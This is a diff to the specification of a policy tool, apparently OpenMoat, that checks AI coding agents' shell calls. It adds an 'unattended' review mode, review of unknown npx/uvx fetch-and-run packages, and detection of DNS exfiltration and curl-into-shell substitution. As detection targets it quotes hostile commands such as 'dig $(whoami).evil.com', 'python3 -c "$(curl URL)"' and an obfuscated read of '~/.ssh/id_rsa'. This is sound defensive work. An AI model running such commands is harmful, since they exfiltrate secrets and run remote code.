@@ -68,6 +68,8 @@ require:                            # optional: the least protection level of ea
   agents:                           #   per agent, by host id, in place of `protection` for it
     gemini-cli: hook-only
 
+unattended: defer                   # optional, default defer: `review` holds a defer when the agent asks no one (§5.4)
+
 mcp:                                # optional: how `openmoat mcp proxy` treats a new server (§8)
   trust_first_sight: false          # optional, default false: pin its first tool listing unseen
   browser_open: fetch               # optional, default fetch: a browser MCP page open is a `fetch` (§4); `net` keeps it `net`
@@ -459,6 +461,9 @@ Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.
 - A `perl -i` with `-p` or `-n` whose one `-e` program is only `s` substitutions (`perl -pi -e 's/a/b/g' f`, `-0pi`, `-pi.bak`, `-i -pe`, `-ni`, `-0777 -pi`; any delimiter or bracket pair, `s|a|b|; s/c/d/`) rewrites the files it names and opens nothing else (`shell/in_place.rs`): each file, and its backup, is an `fs.write`, the program is data, and the shell action is the canonical `perl @substitute <program>`, which `text-tools` allows, so the path rules decide (`src/lib.rs` allows, `~/.zshrc` is `shell-rc`, a hook under `.git` is `git-internals`). The `e` flag (which runs the replacement as code), a `$` that is not a capture (`$1`, `${1}`, `$&`) or an anchor, an `@` or a backtick (interpolation such as `@{[ system("id") ]}` runs code), `(?{ … })` in the pattern, anything beside the substitutions (`use …`, `system`, `open`), a `-M` module, a second `-e`, a program file, a program the shell expands a variable into, or no `-i` (`perl -pe 's/a/b/'` prints, so it writes nothing) is not recognised, and the command is decided as any other inline program (§3.1 below).
 - Only a `$` the shell expands is an `env.read`: an unquoted or double-quoted `$NAME`/`${NAME}` (`"$AWS_SECRET_ACCESS_KEY"` is a read), one in an unquoted here-document body, or one in a `<<<` word outside single quotes. The lexer records which part of each word came from single quotes, so `$p` in `sed -n '$p'` and `$NF` in `awk '{print $NF}'` read nothing, and in `'$p'"$TOKEN"` only `TOKEN` is read. Code handed to another shell is classified again as that shell sees it: `sh -c 'echo $SECRET'` and `eval 'echo $SECRET'` read `SECRET`. `$'…'` (ANSI-C quoting) is decoded the way bash decodes it (`\x2f` and `\057` are `/`, `\'` a quote), so `cat $'\x2f'Users/me/.ssh/id_rsa` is a read of that key and `$'moat'` is `moat`; a `$` in the decoded text is still scanned as if unquoted. `$"…"` (locale quoting) is read as `"…"`. A quoted here-document delimiter (`<<'EOF'`) keeps the body literal. `$1`-style field references are not variables and stay allowed. Where GNU and BSD sed would split a script differently (a delimiter inside a bracket expression, text after a label), or take a different word for the script (BSD stops at the first operand, so in `sed p -e x f` it runs `p` and reads `-e` and `x`), every reading is checked and the word stays a file too.
 - A package install is read for the names it fetches from a registry (`shell/installs.rs`, ADR-030): `npm install|i|add`, `pnpm add`, `yarn add`, `yarn global add`, `bun add` (npm); `pip install` (`pip3`, `pip3.12`, `python -m pip`), `uv pip install`, `uv add`, `uv tool install`, `poetry add`, `pipx install` (PyPI); `cargo add` and `cargo install` (crates.io); `gem install` (RubyGems); `go get` and `go install` (Go modules). Versions, extras, markers and options are taken off each name (`requests==2.32`, `uvicorn[standard]`, `@types/node@20`, `serde@1`, `cobra@v1.8.0`). Paths, URLs, archives, git sources (`--git`, `--path`, `github:user/repo`) and requirement files name no registry package, and an install from the lockfile (`npm install`, `pip install -r requirements.txt`) names none. An install gives no atom of its own unless a name is a near miss, so it is decided by its command as before (a rule names a package through the command: `deny: shell: ["npm install event-stream"]`). A name that is not on the bundled list of popular names for its registry but is one edit away from a listed name of five characters or more (a letter added, dropped, changed or two swapped), differs from it only in `-`, `_` and `.` or in doubled letters, or adds or drops a squatter's prefix or suffix (`node-`, `-js`, `.js`, `python-`, `py`, `-py`, `rust-`, `-rs`, `ruby-`, …) gives the atom `@package-near-miss <ecosystem> <name> <popular name>`, with the ecosystem `npm`, `pypi`, `crates`, `rubygems` or `go`, which `package-near-miss` holds for review (§6). Names are compared as each registry compares them: PyPI ignores case and treats `-`, `_` and `.` alike, crates.io ignores case and `-`/`_`, and a Go module's `/v2` suffix does not count.
+- A command that fetches a package and runs it at once (`shell/installs/runs.rs`, ADR-100) names the package it fetches: the value of `-p`/`--package` (`npx`, `bunx`, `pnpx`, `npm exec`, `npm x`, `pnpm dlx`, `yarn dlx`, `bun x`), `--from` (`uvx`, `uv tool run`, which also fetch each `--with`) or `--spec` (`pipx run`), otherwise the first word after the options. A near miss gives `@package-near-miss` as an install does; any other name not on the popular list gives `@package-run-unknown <ecosystem> <name>`, which `package-run-unknown` holds for review (§6); a popular name gives no atom. `--no`, `--no-install` and `--offline` fetch nothing, so they name none; `pnpm exec`, `yarn exec` and `uv run` run what is already installed and are not read.
+- A name a program that names hosts gets, built at run time (`dig $(whoami).evil.com`, `nslookup ${X}.evil.com`, `host -t txt $C.evil.com`), is a `net` atom for the fixed domain after its last expansion: the lookup goes to that domain's name server and carries what the name was built from (DNS exfiltration). `drill`, `kdig`, `delv`, `getent` and `resolvectl` name hosts as `dig` does.
+- A command substitution in the program's place (`$(curl URL)`, also inside a shell's single-quoted string, which that shell expands), in an interpreter's inline code (`python3 -c "$(curl URL)"`), or in the command `find -exec` or `xargs` runs is the substituted command piped into the program that runs it, so `curl URL | sh`'s rule decides it (`pipe-to-shell`).
 
 ### 3.2 Path, host and name globs
 - `*` matches within one path segment; `**` matches across segments: `~/.ssh/**`, `**/.env.*`.
@@ -1016,7 +1021,7 @@ A deny or review from one of OpenMoat's own checks that reaches the agent (`unpa
 `unchecked`, `executables`, `kernel-integrity`, `kernel-error`, `mcp-server-changed`,
 `ungoverned`, `project-settings`, `session-taint`, `injected-input`, `mcp-cross-server`,
 `protected-contents`, `session-written-code`, `push-secret`, `push-runs-later`,
-`push-unchecked`, `protection-required`) carries the block message as a titled rule does (§2), with OpenMoat's
+`push-unchecked`, `protection-required`, `unattended`) carries the block message as a titled rule does (§2), with OpenMoat's
 own title and `why` (ADR-059, amended); a rule of your policy with one of these ids keeps
 your words. `default.<kind>` and the ids of `openmoat mcp proxy`, `openmoat proxy` and
 `policy check-diff` keep their own output.
@@ -1043,6 +1048,7 @@ your words. `default.<kind>` and the ids of `openmoat mcp proxy`, `openmoat prox
 | `mcp-cross-server` | review | an MCP call carries a piece of text (an address, an email address, a long token, a run of eight words) that another wrapped server returned earlier in the session into a tool that writes or sends, and neither server is in `mcp.flow_trusted` (§8, ADR-058) |
 | `protected-contents` | review | the call reads a folder that holds paths a deny rule names (`cp -r ~/.codex x`, `grep -r . ~/.gemini`, `ls ~/.codex`), or writes into one (`tar xf a.tar -C ~/.config`): the folder rule (§3.2, ADR-038) |
 | `session-written-code` | review | the call runs a file the same host session wrote (`python3 x.py`, `bash x.sh`, `./x`) and no OS sandbox from OpenMoat holds it (§4.3, ADR-039) |
+| `unattended` | review | the policy says `unattended: review`, the call would be a `defer`, and the agent runs in a mode in which it runs such a call with no person asked (§5.4, ADR-100); the agent receives it as a deny that says how to approve it |
 | `push-secret` | deny | a commit a `git push` or `gh pr create` would publish adds a known token format or a brokered secret's value (§4.2) |
 | `push-runs-later` | review | the session read untrusted content or a secret, and the push changes a file `runs-later` names (§4.2) |
 | `push-unchecked` | review | what a push would publish could not be checked within 10 s or 8 MiB, or where it runs is not known (§4.2) |
@@ -1146,6 +1152,38 @@ Seatbelt and Landlock rules of `openmoat run` are generated from it.
   `allowances`, and what a host needs to run, which `openmoat sandbox show` lists. Network
   to the cloud-metadata hosts (`moat.cloud-metadata`) is denied whatever the policy says.
 
+### 5.4 When no one is asked (`unattended:`)
+
+A `defer` leaves the call to the agent's own permission flow (ADR-025). Some agents have
+modes in which that flow asks no one: it runs the call. `unattended: review` in your own
+policy holds such a call for review instead (ADR-100):
+
+```yaml
+unattended: review    # default defer
+```
+
+- **Which modes count.** Only what the agent's hook can see, as each agent's spec states:
+  Claude Code's `permission_mode` `bypassPermissions` or `auto` in the payload; pi without
+  a screen (print and JSON mode); Hermes Agent in YOLO mode or with approvals off, and
+  Antigravity CLI with `toolPermission: always-proceed`, as `openmoat guard` reads them
+  from the hook's variables and the agent's settings. A mode that refuses what it would ask
+  about (Claude Code's `dontAsk`) is not one: a deferred call does not run there.
+  `cline --auto-approve`, OpenCode 2's `--auto`, Codex's approval policy `never`, Gemini
+  CLI's `--yolo` and GitHub Copilot CLI's `--allow-all-tools` are flags or settings the hook
+  is not shown, so they are not detected (ADR-100 lists why).
+- **What changes.** A call that would be a `defer` becomes a `review` with the rule
+  `unattended` (the `default` and other rules stay), and a `review` in such a mode reaches
+  the agent as a deny that says how to approve it: `openmoat`, `openmoat allow --last`, or
+  the approvals channel (APPROVALS.md), which can approve it from your phone. An `allow` and
+  a `deny` are as before, and so is a tool OpenMoat does not govern (`ungoverned`).
+- **Who may set it.** The person's policy only, pinned by the lock like every other key: a
+  repository policy (§10) or a pack (§11) with the key does not parse.
+- **Why `defer` is the default.** Under the default policy most commands an agent runs
+  defer; with `review` every one of them waits for `openmoat allow` in such a mode, which
+  is the point for a run nobody watches and a stop for one a person watches with the
+  prompts off. Set it where agents run unattended (a CI job, a scheduled run, `claude -p`
+  in `bypassPermissions`).
+
 ## 6. The default policy, in one table
 
 | List | Rule id | What it covers |
@@ -1190,6 +1228,7 @@ Seatbelt and Landlock rules of `openmoat run` are generated from it.
 | review | `other-home` | any path in another user's home (`~alice/.ssh/id_rsa`, the `@other-home` atom), which OpenMoat cannot place and which may hold that user's secrets |
 | review | `opaque-code` | `<program> @<argument>` atoms of `awk`, `sed`, `sort`, `uniq`, `cut` (a program or option the classifier cannot prove harmless, §3.1), `printf -v`, setting `CDPATH`, `<shell> @stdin`: text piped into a shell that the command line does not show (`printf '\x63at .env' \| sh`), and `@opaque-code <interpreter>`: inline code that opens files, connects, reads the environment or runs programs with text it builds at run time (§3.1); and `@opaque-code <runner>`: a `cmd`, PowerShell or `wt` line built at run time, whose program cannot be read (`wsl-crossing`, ADR-083) |
 | review | `package-near-miss` | installing a package whose name is not on the bundled list of popular names for its registry but is one typo or a common trick away from one that is (the `@package-near-miss` atom, §3.1): `pip install reqeusts`, `npm i lodahs`, `npm i react_dom`, `pip install python-requests`, `cargo add tokio-rs`. The reason names the popular package. A popular name, or one far from every popular name, is not held for review: unknown packages are normal, so those installs defer like any other |
+| review | `package-run-unknown` | fetching a package and running it at once (`npx`, `bunx`, `pnpx`, `npm exec`/`npm x`, `pnpm dlx`, `yarn dlx`, `bun x`, `uvx`, `uv tool run`, `pipx run`) when its name is not on the bundled popular list, pinned to a version or not (the `@package-run-unknown` atom, §3.1, ADR-100): `npx create-helper-kit`, `uvx helper-kit-cli@0.3`. A near miss is `package-near-miss`; a popular name defers as its install does; `npx --no-install`, `npm exec --no` and `uvx --offline` fetch nothing, so they name no package |
 | review | `docker-secrets` | `docker build` with the options `dev-shell` leaves out (`--secret`, `--ssh`, `--build-context`, `--network`, `--output`, …) |
 | review | `container-host` | since 0.17.0: `docker`, `podman` and `nerdctl` commands that hand a container the host: `--privileged`, a host namespace (`--pid`, `--ipc`, `--uts`, `--userns`, `--cgroupns`, `--net`/`--network` set to `host`), `--cap-add`, `--device`, `--security-opt`, the host's root (`-v /:…`, `--volume=/:…`, `--mount …source=/`) or the Docker socket mounted in. Tokens are matched as written, so other spellings defer like any other `docker run`; a key folder mounted in is decided by its path |
 | review | `agent-token` | `claude setup-token`, which signs in and prints a new long-lived Claude Code login token: the person may want one (a CI secret), the agent should not make one unasked |
